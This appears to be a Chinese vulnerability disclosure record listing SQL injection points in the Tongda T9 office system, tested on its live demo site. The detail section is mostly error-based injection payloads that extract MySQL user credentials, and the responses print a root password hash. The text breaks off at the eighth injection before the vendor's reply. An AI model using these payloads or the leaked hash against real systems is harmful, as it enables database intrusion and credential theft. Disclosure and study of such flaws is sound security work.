wybug_title: 通达T9系统sql注射10处打包(demo站点root权限)
wybug_detail: 漏洞详情 披露状态：   									2015-03-13：	细节已通知厂商并且等待厂商处理中									2015-03-16：	厂商已经确认，细节仅向厂商公开									2015-03-19：	细节向第三方安全合作伙伴开放									2015-05-10：	细节向核心白帽子及相关领域专家公开									2015-05-20：	细节向普通白帽子公开									2015-05-30：	细节向实习白帽子公开									2015-06-14：	细节向公众公开  简要描述： T9智能管理平台是基于B/S架构，灵活、稳定、安全、高性能的办公系统。采用自主研发的引擎技术，提供强大的工作流和公文流程管理功能，可完全根据客户需求定制办公门户平台。 详细说明：  测试地址	http://t9.go2oa.com/t9/core/frame/webos/index.jsp	测试帐号及密码	oa/无注入1:http://t9.go2oa.com/t9/t9/core/funcs/email/act/T9EmailBoxAct/isBoxNameExist.act? post:boxName=test' and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23%3BPERSON%2CSEQ_ID%2CUSER_NAME&_=&boxId=1 返回结果:{"rtState":"1", "rtMsrg":"邮箱默认每页显示邮件数设置失败: Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 1", "rtData":""}注入2:http://t9.go2oa.com/t9/t9/core/funcs/email/act/T9InnerEMailAct/deletMailForShort.act post:shortCutType=1&delType=1&boxId=0 and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23返回：{"rtState":"1", "rtMsrg":"邮件删除失败！可能原因：Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 1", "rtData":""}注入3：http://t9.go2oa.com/t9/t9/core/funcs/email/act/T9InnerEMailAct/listInBox.act?boxId=0 and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&queryType=null&startDate=&mailStatus=&endDate=&subject=&key1=&key2=&key3=&userId= 返回:{"rtState":"1", "rtMsrg":"Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 1", "rtData":""}注入4：http://t9.go2oa.com/t9/t9/core/funcs/system/ispirit/n12/group/act/T9ImGroupAct/deleteGroup.act post:seqId=4)and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23返回：{"rtState":"1", "rtMsrg":"Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 1", "rtData":""}注入5：http://t9.go2oa.com/t9/t9/core/funcs/email/act/T9InnerEMailAct/readFlag.actpost:mailId=5) and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&fieldValue=1&_=返回：{"rtState":"1", "rtMsrg":"加载代码失败Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 1", "rtData":""}注入6：http://t9.go2oa.com/t9/t9/core/funcs/system/ispirit/n12/group/act/T9ImGroupAct/startGroup.act post：seqId=' and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23返回结果：{"rtState":"1", "rtMsrg":"Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 1", "rtData":""}注入7:http://t9.go2oa.com/t9/t9/core/funcs/doc/act/T9FlowTypeAct/getFlowTypeJson.act?sortId=184) and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23返回:{"rtState":"1", "rtMsrg":"Duplicate entry 'localhostroot*91AF99F23C3D4ED85140D100433725DFA52BECEE1' for key 1", "rtData":""}注入8:http://t9.go2oa.com/t9/t9/core/funcs/doc/flowrunRec/act/T9MyWorkAct/getMyWorkList.act?sortId=184) and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23post:pageIndex=1&showLength=10&flowId=0&typeStr=2&_=返回结果：{"rtState":"1", "rtMsrg":"Duplicate entry wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-03-16 10:03 厂商回复： T9产品已停止销售 最新状态： 暂无
